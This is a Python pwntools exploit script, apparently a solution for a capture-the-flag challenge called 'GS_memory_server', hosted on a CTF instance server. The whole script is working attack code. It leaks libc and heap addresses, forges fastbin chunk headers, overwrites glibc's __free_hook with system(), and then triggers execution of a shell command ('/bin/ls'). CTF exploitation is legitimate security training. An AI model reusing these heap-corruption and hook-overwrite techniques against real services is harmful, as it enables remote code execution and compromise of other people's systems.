#!/usr/bin/env python3

from pwn import *

exe = ELF("GS_memory_server_patched")
libc = ELF("libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe
# context.log_level = "debug"

def conn():
    if args.LOCAL:
        r = remote("127.0.0.1", 1337)
        # if args.DEBUG:
        #     gdb.attach(r)
    else:
        r = remote("instances.challenge-ecw.fr", 41621)

    return r

def send_int(r, i):
    r.send(int.to_bytes(i, 4, "little"))

def send_long(r, i):
    r.send(int.to_bytes(i, 8, "little"))

def send_0_get_informations(r):
    send_int(r, 0)
    log.info(f"RAM_info = {r.recv()}")

def send_1_RAM_malloc(r, size, should_use_crypto):
    send_int(r, 1)
    send_int(r, size | (should_use_crypto<<16))
    RAM_malloc_res = int.from_bytes(r.recv(4), "little")
    log.info(f"RAM_malloc_res = {hex(RAM_malloc_res)}")
    if RAM_malloc_res == 0:
        RAM_id = int.from_bytes(r.recv(4), "little")
        log.info(f"RAM_id = {hex(RAM_id)}")

def send_2_RAM_free(r, ram_id):
    send_int(r, 2)
    send_int(r, ram_id)
    RAM_free_res = int.from_bytes(r.recv(4), "little")
    log.info(f"RAM_free_res = {hex(RAM_free_res)}")

def send_3_RAM_decrypt(r, ram_id):
    send_int(r, 3)
    send_int(r, ram_id)
    RAM_decrypt_res = int.from_bytes(r.recv(4), "little")
    log.info(f"RAM_decrypt_res = {hex(RAM_decrypt_res)}")
    if RAM_decrypt_res == 0:
        RAM_content_size = int.from_bytes(r.recv(2), "little")
        log.info(f"RAM_content_size = {hex(RAM_content_size)}")
        RAM_content = r.recv(RAM_content_size)
        log.info(f"RAM_content = {RAM_content}")
        return RAM_content

def send_4_RAM_encrypt(r, ram_id, size, content):
    assert size == len(content)

    send_int(r, 4)
    send_long(r, (ram_id) | (size<<32))
    r.send(content)
    RAM_encrypt_res = int.from_bytes(r.recv(4), "little")
    log.info(f"RAM_encrypt_res = {hex(RAM_encrypt_res)}")

def send_5_RAM_free_all(r):
    send_int(r, 5)
    RAM_free_all_res = int.from_bytes(r.recv(4), "little")
    log.info(f"RAM_free_all_res = {hex(RAM_free_all_res)}")

def send_6_RAM_available_size(r):
    send_int(r, 6)
    RAM_available_size_res = int.from_bytes(r.recv(4), "little")
    log.info(f"RAM_available_size_res = {hex(RAM_available_size_res)}")
    RAM_available_size = int.from_bytes(r.recv(4), "little")
    log.info(f"RAM_available_size = {hex(RAM_available_size)}")

def send_7_RAM_unfragment(r):
    send_int(r, 7)
    RAM_unfragment_res = int.from_bytes(r.recv(4), "little")
    log.info(f"RAM_unfragment_res = {hex(RAM_unfragment_res)}")

class Exploit():
    CURRENT_RAM_ID = 0

    def __init__(self):
        self.heap = 0
    
    def exploit(self):
        # if self.test_cores(48) == True:
        #     log.critical("FOUND SIZE!!!!!!!!!!!!")
        libc.address = self.leak_libc()
        log.info(f"Leaked libc address is {hex(libc.address)}")

        r = conn()
        send_5_RAM_free_all(r)
        r.close()

        self.heap = self.leak_heap()
        log.info(f"Leaked heap address is {hex(self.heap)}")

        r = conn()
        send_5_RAM_free_all(r)
        r.close()

        self.allocate_ram()

    def test_cores(self, nb):
        log.info("Create a chunk in 0x30 fastbin")
        c1 = conn()
        r  = conn()

        ram_id = point_at(r, 0x10410, 0x40)
        send_4_RAM_encrypt(
            r, 
            ram_id, 
            0x40, 
            b"\x00"*8 + 
            0x31.to_bytes(8, "little") +
            b"\x00"*0x18 + 
            0x121.to_bytes(8, "little") +
            0x30.to_bytes(8, "little") +
            0x31.to_bytes(8, "little")
        )
        c1.close()
        r.close()

        r = conn()
        send_5_RAM_free_all(r)
        r.close()

        log.info("Create clients to enforce the use of main arena")
        clients = [conn() for _ in range(8*nb - 2)]

        for client in clients:
            send_1_RAM_malloc(client, 1, 0)
            Exploit.CURRENT_RAM_ID += 1

        log.info("Point to the future created chunk")
        r = conn()
        ram_id = point_at(r, 0x10410-0x666, 0x200)
        send_4_RAM_encrypt(r, ram_id, 0x10, b"\x00"*8 + 0x30.to_bytes(8, "little"))

        log.info("Create chunk")
        ram_chunk = conn()
        send_1_RAM_malloc(ram_chunk, 1, 0)
        ram_chunk_id = Exploit.CURRENT_RAM_ID
        Exploit.CURRENT_RAM_ID += 1

        log.info("Check if the created chunk is really controlled")
        leak = send_3_RAM_decrypt(r, ram_id)
        return leak.count(b"\x00") != 511

    def allocate_ram(self):
        log.info("Create a chunk in 0x30 fastbin")
        r = conn()
        c2 = conn()
        c1 = conn()
        ram_id = point_at(r, 0x10530, 0x60)
        send_4_RAM_encrypt(
            r, 
            ram_id, 
            0x60, 
            b"\x00"*8 + 
            0x21.to_bytes(8, "little") +
            b"\x00"*0x10 + 
            0x20.to_bytes(8, "little") +
            0x31.to_bytes(8, "little") +
            b"\x00"*0x18 + 
            0x121.to_bytes(8, "little") +
            0x30.to_bytes(8, "little") +
            0x31.to_bytes(8, "little")
        )
        c1.close()
        r.close()
        c2.close()

        r = conn()
        send_5_RAM_free_all(r)
        r.close()

        log.info("Create clients to enforce the use of main arena")
        clients = [conn() for _ in range(126)]

        for client in clients:
            send_1_RAM_malloc(client, 1, 0)
            Exploit.CURRENT_RAM_ID += 1

        log.info("Point to the future created chunk")
        r = conn()
        ram_id = point_at(r, 0x10530-0x646, 0x200)
        # ram_id = point_at(r, 0x10530-0x646, 0x1)
        send_4_RAM_encrypt(r, ram_id, 0x10, b"\x00"*8 + 0x30.to_bytes(8, "little"))

        log.info("Create chunk")
        ram_chunk = conn()
        send_1_RAM_malloc(ram_chunk, 1, 0)
        ram_chunk_id = Exploit.CURRENT_RAM_ID
        Exploit.CURRENT_RAM_ID += 1

        log.info("Check if the created chunk is really controlled")
        leak = send_3_RAM_decrypt(r, ram_id)
        print(leak)

        log.info("Try to go to __free_hook")
        send_4_RAM_encrypt(
            r, 
            ram_id, 
            0x20, 
            b"\x00"*8 + 
            0x31.to_bytes(8, "little") +
            b"\x00"*8 +
            (libc.symbols["__free_hook"] - 0x624).to_bytes(8, "little")
        )
        send_4_RAM_encrypt(
            r, 
            0, 
            0x30, 
            b"\x00"*0x24 +
            b"\x00"*2 +
            0x200.to_bytes(2, "little") +
            0x200.to_bytes(2, "little") +
            b"\x00"*6
        )
        send_4_RAM_encrypt(
            r, 
            ram_id, 
            0x20, 
            b"\x00"*8 + 
            0x31.to_bytes(8, "little") +
            b"\x00"*8 +
            (libc.symbols["__free_hook"] - 0x624 + 0x30).to_bytes(8, "little")
        )
        send_4_RAM_encrypt(
            r, 
            0, 
            0x200, 
            b"\x00"*0x1f4 +
            b"\x00"*2 +
            0x200.to_bytes(2, "little") +
            0x200.to_bytes(2, "little") +
            b"\x00"*6
        )
        send_4_RAM_encrypt(
            r, 
            ram_id, 
            0x20, 
            b"\x00"*8 + 
            0x31.to_bytes(8, "little") +
            b"\x00"*8 +
            (libc.symbols["__free_hook"] - 0x624 + 0x30 + 0x200).to_bytes(8, "little")
        )
        send_4_RAM_encrypt(
            r, 
            0, 
            0x200, 
            b"\x00"*0x1f4 +
            b"\x00"*2 +
            0x200.to_bytes(2, "little") +
            0x200.to_bytes(2, "little") +
            b"\x00"*6
        )
        send_4_RAM_encrypt(
            r, 
            ram_id, 
            0x20, 
            b"\x00"*8 + 
            0x31.to_bytes(8, "little") +
            b"\x00"*8 +
            (libc.symbols["__free_hook"] - 0x624 + 0x30 + 0x200 + 0x200).to_bytes(8, "little")
        )
        send_4_RAM_encrypt(
            r, 
            0, 
            0x1e8, 
            b"\x00"*0x1dc +
            b"\x00"*2 +
            0x200.to_bytes(2, "little") +
            0x200.to_bytes(2, "little") +
            b"\x00"*6
        )
        send_4_RAM_encrypt(
            r, 
            ram_id, 
            0x20, 
            b"\x00"*8 + 
            0x31.to_bytes(8, "little") +
            b"\x00"*8 +
            (libc.symbols["__free_hook"] - 0x624 + 0x30 + 0x200 + 0x200 + 0x1e8).to_bytes(8, "little")
        )
        send_4_RAM_encrypt(r, 0, 0x8, libc.symbols["system"].to_bytes(8, "little"))
        
        log.info("Will exploit...")
        payload = b"/bin/ls"
        send_4_RAM_encrypt(
            r, 
            ram_id, 
            0x200, 
            b"\x00"*0x150 + 
            payload + b"\x00"*(0xb0-len(payload))
        )
        clients[1].close()
        input(">>>><<<<")


    def leak_libc(self):
        c1 = conn()
        c2 = conn()
        
        r = conn()
        ram_id = point_at(r, 0x10410, 0x20)
        send_4_RAM_encrypt(r, ram_id, 0x10, b"\x00"*8 + 0x141.to_bytes(8, "little"))
        c1.close()
        leak = send_3_RAM_decrypt(r, ram_id)
        r.close()
        c2.close()
        return int.from_bytes(leak[16:24], "little") - libc.symbols["__malloc_hook"] - 112

    def leak_heap(self):
        c1 = conn()
        c2 = conn()

        r = conn()
        ram_id = point_at(c1, 0x10530, 0x40)
        send_4_RAM_encrypt(
            c1, 
            ram_id, 
            0x40, 
            b"\x00"*8 + 
            0x21.to_bytes(8, "little") + 
            b"\x00"*8 +
            0x6.to_bytes(8, "little") + 
            0x20.to_bytes(8, "little") + 
            0x21.to_bytes(8, "little") +
            b"\x00"*8 +
            0x5.to_bytes(8, "little")
        )
        c1.close()
        c2.close()
        leak = send_3_RAM_decrypt(r, ram_id)
        r.close()
        return int.from_bytes(leak[0x30:0x38], "little") - 0x10690


def point_at(r, to_point, size):
    long  = to_point//(0x5c0c + 0xc*2 + 0x10)
    short = (to_point - long*(0x5c0c + 0xc*2 + 0x10))//0x20c
    done  = to_point - long*(0x5c0c + 0xc*2 + 0x10) - short*0x20c

    if done - 2*0xc < 0:
        raise Exception("Not good path found")

    if done - 2*0xc != 0:
        send_1_RAM_malloc(r, done-2*0xc, 0)
        Exploit.CURRENT_RAM_ID += 1

    for _ in range(long):
        send_1_RAM_malloc(r, 0x01, 1)
        send_1_RAM_malloc(r, 0x01, 1)
        send_4_RAM_encrypt(r, Exploit.CURRENT_RAM_ID, 0x10, b"b"*0x10)
        Exploit.CURRENT_RAM_ID += 2

    for _ in range(short):
        send_1_RAM_malloc(r, 0x200, 0)
        Exploit.CURRENT_RAM_ID += 1

    send_7_RAM_unfragment(r)
    send_1_RAM_malloc(r, size, 0)
    Exploit.CURRENT_RAM_ID += 1

    return Exploit.CURRENT_RAM_ID-1



def main():
    exp = Exploit()
    exp.exploit()


if __name__ == "__main__":
    main()
